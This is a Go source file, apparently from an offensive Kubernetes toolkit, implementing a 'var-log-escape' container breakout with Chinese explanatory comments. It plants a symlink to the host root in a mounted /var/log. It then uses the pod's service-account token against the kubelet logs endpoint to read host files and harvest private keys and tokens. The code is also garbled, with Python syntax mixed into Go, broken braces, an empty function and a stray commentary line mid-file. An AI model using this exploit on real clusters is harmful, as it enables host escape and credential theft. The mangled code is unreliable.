# `kubesploit\data\modules\sourcecode\go\var-log-escape\main.go`

```
package main
// 声明当前文件所属的包为 main

import (
	"crypto/tls"
	// 导入加密/解密相关的包
	"encoding/hex"
	// 导入十六进制编码/解码相关的包
	"fmt"
	// 导入格式化输入输出相关的包
	"io/ioutil"
	// 导入读取文件内容相关的包
	"log"
	// 导入日志记录相关的包
	"net"
	// 导入网络通信相关的包
	"net/http"
	// 导入 HTTP 相关的包
	"os"
	// 导入操作系统相关的包
	"os/exec"
	// 导入执行外部命令相关的包
	"os/user"
	// 导入操作系统用户相关的包
	"path/filepath"
	// 导入文件路径相关的包
	"regexp"
	// 导入正则表达式相关的包
	"strings"
	// 导入字符串处理相关的包
	"time"
	// 导入时间相关的包
)

const (
// 声明常量
# 定义常量 c_PathSecrets，表示 Kubernetes 服务账户的 token 文件路径
c_PathSecrets  = "/var/run/secrets/kubernetes.io/serviceaccount/token"
# 定义常量 c_DownloadPath，表示下载路径
c_DownloadPath = "/exploit/host-data"

# 定义全局变量 g_Bearer，表示身份验证的 token；g_KubeletEndPoint，表示 kubelet 的端点地址；g_CountScan，表示扫描次数；g_LastStatusRespond，表示最后一次状态响应的值；g_Client，表示 HTTP 客户端
var (
    g_Bearer, g_KubeletEndPoint      string
    g_CountScan, g_LastStatusRespond int
    g_Client                         *http.Client
)

# 定义函数 checkError，用于检查错误并在出现错误时终止程序
func checkError(i_Error error) {
    if i_Error != nil {
        log.Fatal(i_Error)
    }
}

# 定义函数 initVariables，用于初始化变量
func initVariables() {
    # 获取默认网关地址并赋值给变量 defaultGateTemp
    defaultGateTemp := getDefaultGateway()
    # 将 defaultGateTemp 的值赋给全局变量 g_KubeletEndPoint
    g_KubeletEndPoint = defaultGateTemp
	// 读取指定路径下的文件内容，并检查是否有错误发生
	data, err := ioutil.ReadFile(c_PathSecrets)
	checkError(err)

	// 将读取的文件内容转换为字符串类型的token
	token := string(data)

	// 将token拼接成Bearer格式的字符串，并赋值给全局变量g_Bearer
	bearerTemp := "Bearer " + token
	g_Bearer = bearerTemp

	// 创建一个http.Transport对象，设置最大空闲连接数、空闲连接超时时间、禁用压缩、TLS配置
	tr := &http.Transport{
		MaxIdleConns:       10,
		IdleConnTimeout:    30 * time.Second,
		DisableCompression: true,
		TLSClientConfig:    &tls.Config{InsecureSkipVerify: true},
	}

	// 创建一个http.Client对象，设置传输方式和超时时间，并赋值给全局变量g_Client
	g_Client = &http.Client{
		Transport: tr,
		Timeout:   time.Second * 10,
	}
}

func getMountPathIfExists() string {
	// 在这里实现函数getMountPathIfExists的功能
}
// 使用 exec 包执行 shell 命令，获取 /proc/self/mountinfo 中包含 /var/log 的行
cmd := `cat /proc/self/mountinfo | grep /var/log || true`
out, err := exec.Command("sh", "-c", cmd).Output()
checkError(err)

// 定义正则表达式匹配模式
pattern := ".*? .*? .*? (.*?) (.*?) .*?\n"
r, err := regexp.Compile(pattern)
checkError(err)

// 使用正则表达式匹配 /proc/self/mountinfo 中包含 /var/log 的行，并提取相关信息
match := r.FindAllStringSubmatch(string(out), -1)
for _, matchInner := range match {
    // 如果匹配到 /var/log 目录，则返回对应的信息
    if matchInner[1] == "/var/log" {
        return matchInner[2]
    }
}
// 如果没有匹配到 /var/log 目录，则返回空字符串
return ""
}

// 获取默认网关信息
func getDefaultGateway() string {
    // 使用 exec 包执行 shell 命令，获取 /proc/net/route 中的内容
    cmd := `cat  /proc/net/route`
    out, err := exec.Command("sh", "-c", cmd).Output()

    // 定义正则表达式匹配模式
    pattern := `\n[^[:space:]]*?[[:space:]]00000000[[:space:]](.*?)[[:space:]]`
// 使用给定的正则表达式模式编译正则表达式
r, err := regexp.Compile(pattern)
// 检查是否有错误发生
checkError(err)
// 在字符串中查找所有匹配给定模式的子字符串
match := r.FindAllStringSubmatch(string(out), -1)

// 获取匹配结果中的第一个子匹配的值
getway := match[0][1]
// 将十六进制字符串解码为字节数组
a, _ := hex.DecodeString(getway)
// 格式化字节数组中的值为 IP 地址格式
return fmt.Sprintf("%v.%v.%v.%v", a[3], a[2], a[1], a[0])
}

// 向指定路径的文件中写入内容
func writeToScanFile(i_DirPath string, i_ContentToWrite string) {
// 打开文件，如果不存在则创建，以追加模式写入，权限为 0644
f, err := os.OpenFile(i_DirPath, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
// 检查是否有错误发生
checkError(err)
// 延迟关闭文件
defer f.Close()

// 向文件中写入指定内容
_, err = f.WriteString(i_ContentToWrite)
// 检查是否有错误发生
checkError(err)
}

// 读取指定路径的资源
func read(i_Path string) string {
// 创建一个新的 HTTP 请求
req, _ := http.NewRequest("GET", fmt.Sprintf("https://%s:10250/logs/root_link%s", g_KubeletEndPoint, i_Path), nil)
# 在请求头中添加授权信息
req.Header.Add("Authorization", g_Bearer)
# 发送请求并获取响应
resp, err := g_Client.Do(req)
# 检查是否有错误发生
checkError(err)

# 保存响应状态码
tempStatus := resp.StatusCode
g_LastStatusRespond = tempStatus

# 如果响应状态码不是200也不是404，则输出错误信息并终止程序
if resp.StatusCode != 200 && resp.StatusCode != 404:
    log.Fatalf("[!] Cannot run exploit, no permissions to access logs on the kubelet\n")

# 如果响应状态码是404，则返回路径不存在的错误信息
if resp.StatusCode == 404:
    return fmt.Sprintf("[!] The path %s does not exists in the host\n", i_Path)

# 读取响应体的内容
body, err := ioutil.ReadAll(resp.Body)
# 检查是否有错误发生
checkError(err)

# 关闭响应体
defer resp.Body.Close()
# 返回响应体的内容
return string(body)
// 读取目录并过滤，返回原始内容和过滤后的内容列表
func readDirAndFilter(i_Path string) (string, []string) {
    // 定义目录匹配的正则表达式
    directoryPattern := "<a href=\"(.*)\""
    // 编译正则表达式
    r, err := regexp.Compile(directoryPattern)
    // 检查错误
    checkError(err)

    // 读取目录内容
    pathContent := read(i_Path)
    // 查找所有匹配的子字符串
    matches := r.FindAllStringSubmatch(pathContent, -1)
    // 创建过滤后的内容列表
    pathContentFiltered := make([]string, len(matches))

    // 遍历匹配结果，将匹配的内容添加到过滤后的内容列表中
    for i, match := range matches {
        pathContentFiltered[i] = match[1]
    }

    // 返回原始内容和过滤后的内容列表
    return pathContent, pathContentFiltered
}

// 创建目录并下载文件
func mkdirAndDownload(i_Path string, i_Query string, i_FileName string) {
    // 拼接文件路径
    filePath := filepath.Join(c_DownloadPath, i_FileName)
# 设置全局变量 g_CountScan 为 0
g_CountScan = 0
# 检查指定路径是否存在，如果不存在则创建
if _, err := os.Stat(c_DownloadPath); os.IsNotExist(err) {
    err = os.MkdirAll(c_DownloadPath, os.FileMode(0766))
    checkError(err)
    fmt.Printf("[i] created dir in: %s \n", c_DownloadPath)
}
# 根据查询条件下载文件
downloadByQuery(i_Path, i_Query, filePath)
# 打印找到的文件数量
fmt.Printf("[+] found %d %s in %s\n", g_CountScan, i_FileName, i_Path)
# 重置全局变量 g_CountScan 为 0
g_CountScan = 0
}

# 查询函数，判断内容是否匹配查询条件
func query(i_Query string, i_Content string, i_FullPath string) bool {
    var match bool
    # 使用 filepath.Match 函数判断内容是否匹配查询条件
    match, err := filepath.Match(i_Query, i_Content)
    checkError(err)

    # 如果不匹配则直接返回
    if match == false {
        return match
    }
    # 用于重复标记的注释
// 如果查询条件为 "token" 并且匹配成功，则执行以下操作
if i_Query == "token" && match == true {
    // 定义匹配文件名的正则表达式模式
    pattern := `.*\.\.\d+_\d+_\d+_\d+_\d+_\d+\.\d+\/token`
    // 编译正则表达式模式
    r, err := regexp.Compile(pattern)
    // 检查是否有错误发生
    checkError(err)
    // 检查文件路径是否匹配正则表达式模式
    match = !r.MatchString(i_FullPath)
}

// 返回匹配结果
return match
}

// 根据查询条件下载文件
func downloadByQuery(i_Path string, i_Query string, i_FilePath string) {
    // 排除的文件夹
    excludedFolders := "proc/"
    var currPath string

    // 读取目录并过滤
    _, pathContentFiltered := readDirAndFilter(i_Path)
    // 遍历过滤后的目录内容
    for _, dirContent := range pathContentFiltered {

        // 如果目录内容为排除的文件夹，则跳过
        if dirContent == excludedFolders {
            continue
        }
```
以上是对给定代码的注释。希望对你有所帮助！
# 使用 filepath.Join() 函数将 i_Path 和 dirContent 拼接成完整的路径
currPath = filepath.Join(i_Path, dirContent)

# 如果 dirContent 是以 "/" 结尾的目录，则调用 downloadByQuery() 函数进行下载，并跳过当前循环
if strings.HasSuffix(dirContent, "/"):
    downloadByQuery(currPath, i_Query, i_FilePath)
    continue

# 调用 query() 函数匹配 i_Query 和 dirContent，如果匹配成功，则将 currPath 格式化并写入扫描文件，并增加扫描计数器
match = query(i_Query, dirContent, currPath)
if match:
    currPath = fmt.Sprintf("%s\n\n", currPath)
    writeToScanFile(i_FilePath, currPath)
    g_CountScan++
}

# 定义函数 lsh()，传入参数 i_Path
func lsh(i_Path string) string:
    # 调用 readDirAndFilter() 函数读取并过滤目录内容
    pathContent, pathContentFiltered = readDirAndFilter(i_Path)
    # 定义变量 allDir
    var allDir string
# 如果最后一个状态响应为404，则返回路径内容
if g_LastStatusRespond == 404 {
    return pathContent
}

# 如果路径内容经过过滤后长度为0且原始路径内容长度不为0，则返回格式化的字符串，表示路径不是一个目录
if len(pathContentFiltered) == 0 && len(pathContent) != 0 {
    return fmt.Sprintf("[!] %s is not a directory", i_Path)
}

# 遍历经过过滤后的路径内容，将每个匹配的路径去除末尾的斜杠，并拼接成一个字符串
for i, match := range pathContentFiltered {
    dir := strings.TrimSuffix(match, "/")
    if i == 0 {
        allDir = dir
    } else {
        allDir = fmt.Sprintf("%s\n%s", allDir, dir)
    }
}

# 返回拼接后的所有路径字符串
return allDir
# 定义一个函数，用于拼接路径
func cath(i_Path string) string {
    # 调用 readDirAndFilter 函数，获取路径内容和过滤后的路径内容
    pathContent, pathContentFiltered := readDirAndFilter(i_Path)

    # 如果过滤后的路径内容长度大于等于1，则返回路径是一个目录的提示
    if 1 <= len(pathContentFiltered) {
        return fmt.Sprintf("[-] %s is a directory", i_Path)
    }

    # 否则返回路径内容
    return pathContent
}

# 定义一个函数，用于检查当前用户是否为 root 用户
func isRoot() bool {
    # 获取当前用户信息和可能的错误
    currentUser, err := user.Current()
    # 检查是否有错误发生
    checkError(err)
    # 返回当前用户是否为 root 用户
    return currentUser.Username == "root"
}

# 定义一个函数，用于附加到 root 用户
func attachToRoot() string {
    # 获取挂载路径（如果存在）
    path := getMountPathIfExists()
    # 如果路径为空，则返回无法继续利用的提示
    if path == "" {
        return fmt.Sprintf("[!] No root mount to /var/log exists in the pod, cant continute to the exploit\n")
    }
	}
	// 检查当前进程是否为 root 用户
	if isRoot() {
		// 如果是 root 用户，创建一个指向根目录的符号链接
		if err := os.Symlink("/", fmt.Sprintf("%s%s", path, "/root_link")); err != nil {
			// 如果符号链接已经存在，打印提示信息并继续执行 exploit
			if os.IsExist(err) {
				fmt.Println("[i] Symlink already exists , continue to the exploit")
				return ""
			}
			// 如果出现其他错误，打印错误信息
			checkError(err)
		}
	} else {
		// 如果不是 root 用户，返回提示信息
		return fmt.Sprintf("[!] The process is not running as root, cant continute to the exploit\n")
	}

	// 打印创建符号链接成功的提示信息
	fmt.Println("[i] Create symlink succeeded")
	return ""
}

// 从 root 用户中分离
func dettachFromRoot() {
	// 检查是否存在指向 /var/log/host/root_link 的符号链接
	if _, err := os.Lstat("/var/log/host/root_link"); err == nil {
		// 删除指定路径的文件或目录
		err := os.Remove("/var/log/host/root_link")
		// 检查错误
		checkError(err)
	} else {
		// 如果文件或目录不存在
		if os.IsNotExist(err) {
			// 打印消息并结束 exploit
			fmt.Println("[i] Symlink is not exists, ending exploit")
			return
		}
		// 检查错误
		checkError(err)
	}

	// 打印消息，说明符号链接删除成功
	fmt.Printf("[i] Removed symlink succeeded\n")
}

// 空函数，没有具体实现
func dirMessage(i_FileName string) {
}

// 判断错误是否为超时错误
func isTimeoutError(err error) bool {
	// 尝试将错误转换为 net.Error 类型，判断是否为超时错误
	e, ok := err.(net.Error)
	return ok && e.Timeout()
// 对于 hostnetwork=true 的情况，测试与 kubelet 的连接
func testConnectionToKubelet() bool {
    // 创建一个 HTTP 请求，用于获取 kubelet 的日志
    req, _ := http.NewRequest("GET", fmt.Sprintf("https://%s:10250/logs/root_link/", g_KubeletEndPoint), nil)
    // 添加授权信息到请求头
    req.Header.Add("Authorization", g_Bearer)
    // 发起请求并获取响应
    _, err := g_Client.Do(req)
    // 如果不是超时错误，则处理其他类型的错误并返回 true
    if !isTimeoutError(err) {
        checkError(err)
        return true
    }

    // 创建另一个 HTTP 请求，用于获取 kubelet 的日志
    req, _ = http.NewRequest("GET", "https://0.0.0.0:10250/logs/root_link/", nil)
    // 添加授权信息到请求头
    req.Header.Add("Authorization", g_Bearer)
    // 发起请求并获取响应
    _, err = g_Client.Do(req)
    // 如果不是超时错误，则处理其他类型的错误并返回 true，并将 kubelet 的端点设置为 "0.0.0.0"
    if !isTimeoutError(err) {
        checkError(err)
        g_KubeletEndPoint = "0.0.0.0"
        return true
    }
}
# 返回布尔值 false
	return false
}

# 主函数，接受命令和选项作为参数
func mainfunc(i_Command string, i_Option string) {
	# 调用 attachToRoot 函数，将返回的消息赋值给 msg
	msg := attachToRoot()
	# 如果 msg 不为空，则打印消息并返回
	if msg != "" {
		fmt.Print(msg)
		return
	}

	# 初始化变量
	initVariables()
	# 测试与 kubelet 的连接，如果连接不成功则打印消息并返回
	if !testConnectionToKubelet() {
		fmt.Print("[i] Can't connect to kubelet, ending exploit\n")
		return
	}

	# 根据 i_Command 的值进行不同的操作
	switch i_Command {
	case "lsh":
		# 调用 lsh 函数并打印返回结果
		fmt.Println(lsh(i_Option))
# 根据命令行参数执行不同的操作
case "cath":
    # 如果参数为"cath"，则执行cath函数
    fmt.Println(cath(i_Option))
case "scan":
    # 如果参数为"scan"，则根据子参数执行不同的操作
    switch i_Option:
        case "key":
            # 如果子参数为"key"，则在指定目录中创建并下载以.key结尾的文件，存放到private-keys目录中
            mkdirAndDownload("/home/", "*.key", "private-keys")
            mkdirAndDownload("/etc/", "*.key", "private-keys")
            mkdirAndDownload("/var/lib/kubelet/pods/", "*.key", "private-keys")
            mkdirAndDownload("/var/lib/docker/", "*.key", "private-keys")
            mkdirAndDownload("/usr/", "*.key", "private-keys")
            # 显示操作完成的消息
            dirMessage("private-keys")
        case "token":
            # 如果子参数为"token"，则在指定目录中创建并下载名为token的文件，存放到tokens目录中
            mkdirAndDownload("/var/lib/kubelet/pods/", "token", "tokens")
            # 显示操作完成的消息
            dirMessage("tokens")
        default:
            # 如果子参数不匹配任何情况，则显示用法说明
            usage()
    default:
        # 如果参数不匹配任何情况，则显示用法说明
        usage()
# 从根目录中分离
dettachFromRoot()

# 显示用法信息
func usage() {
    fmt.Println("[i] Usage: [cath|lsh] <host_path>")
    fmt.Println("[i] Usage: [scan] [token|key]")
}
```